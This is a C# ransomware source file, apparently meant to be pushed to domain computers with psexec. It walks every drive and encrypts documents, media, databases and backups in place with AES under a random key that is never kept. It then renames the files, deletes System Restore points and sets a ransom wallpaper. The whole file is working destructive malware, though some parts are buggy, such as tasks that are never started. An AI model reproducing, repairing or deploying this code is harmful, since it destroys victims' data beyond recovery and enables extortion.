/*
  ransom enacom 
  run as AD psexec foreach computers hostname
*/

using System;
using Microsoft.Win32;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using System.Net;
using System.Threading.Tasks;
using System.Management;
using System.Runtime.InteropServices;

namespace madeinargentina
{
	class Program
	{
		const int SPI_SETDESKWALLPAPER = 20;
		const int SPIF_UPDATEINIFILE = 0x01;
		const int SPIF_SENDWININICHANGE = 0x02;

		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

		public static string generar_pass(int t){
			StringBuilder s = new StringBuilder ();
			Random r = new Random ();
			char c;
			for (int i = 0; i < t; i++) {
				c = Convert.ToChar(Convert.ToInt32(Math.Floor( 56 * r.NextDouble() + 128)));
				s.Append (c);
			}
			return s.ToString ();
		}

		public static void doit(string target){
			string pass = generar_pass (128);
			byte[] passb = Encoding.UTF8.GetBytes (pass);
			passb = SHA256.Create ().ComputeHash (passb);

			byte[] jmp = new byte[] { 3, 5, 7, 11, 13, 17, 19, 23 };
			using (FileStream fs = new FileStream(target, FileMode.OpenOrCreate, FileAccess.Write)) {
				using (RijndaelManaged AES = new RijndaelManaged()) {
					AES.KeySize = 256;
					AES.BlockSize = 128;
					var key = new Rfc2898DeriveBytes (passb, jmp, 1000);
					AES.Key = key.GetBytes (AES.KeySize / 8);
					AES.IV = key.GetBytes (AES.BlockSize / 8);
					AES.Mode = CipherMode.CBC;
					using (var cs = new CryptoStream(fs, AES.CreateEncryptor(), CryptoStreamMode.Write)) {
						using (FileStream ip = new FileStream(target, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)) {
							int d;
							int mbe = 100 * 1024 * 1024;
							int bn = 0;
							while ((d = ip.ReadByte()) != -1 && bn < mbe) {
								cs.WriteByte ((byte)d);
								bn++;
							}
							ip.Close ();
						}
						cs.Close ();
					}
				}
				fs.Close ();
			}
			File.Move (target, target + ".s");
		}

		public static void doitdir(string dir){
		    string[] ext = {".txt", ".pdf", ".mp4", ".mp3", ".csv", ".xml",".docx", ".doc", ".xls", ".xlsx", ".odt", ".php", ".html", ".htm", ".asp", ".aspx", ".jpg", ".jpeg", ".png", ".sql", ".back", ".backup", ".ppt", ".pptx", ".gif", ".rtf", ".zip", ".rar", ".log", ".db", ".sqlite", ".wav", ".tar.gz", ".iso"};

			foreach (string f in Directory.GetFiles(dir)) {
				string extension = Path.GetExtension (f);
				foreach (string k in ext) {
					if (k.Contains (extension)) {
						new Task (() => {
							doit (f); 
						});
					}
				}
			}

			foreach (string d in Directory.GetDirectories(dir)) {
				doitdir (d);
			}
		}

		[DllImport("Srclient.dll")]
		public static extern int DeleteRestorePoint(int index);

		public static void byebye(){
			System.Management.ManagementClass objClass = new System.Management.ManagementClass("\\\\.\\root\\default", "systemrestore", new System.Management.ObjectGetOptions());
			System.Management.ManagementObjectCollection objCol = objClass.GetInstances();
			String[] sequencenums = new String[100]; 
			int c = 0;
			foreach (System.Management.ManagementObject objItem in objCol)
			{
				sequencenums[c] = (((uint)objItem["sequencenumber"]).ToString());
				c++;
			}

			while (c >= 0)
			{
				DeleteRestorePoint(Convert.ToInt32(sequencenums[c]));
				c--;
			}
		}

		public static void fondo()
		{
			string imgb64 = "";
			var imgb = Convert.FromBase64String (imgb64);
			using (var img = new FileStream("C:\\fondo.jpg", FileMode.Create)) {
				img.Write (imgb, 0, imgb.Length);
				img.Flush ();
			}

			SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, "C:\\fondo.jpg", SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
		}

	    static void Main (string[] args)
		{
			string[] particiones = System.IO.Directory.GetLogicalDrives ();
			foreach (string p in particiones) {
				Console.WriteLine ("Encriptando: " + p);
				doitdir (p);
				Console.WriteLine("Eliminando copias de seguridad...");
				byebye ();
				fondo ();
			}
		}
	}
}
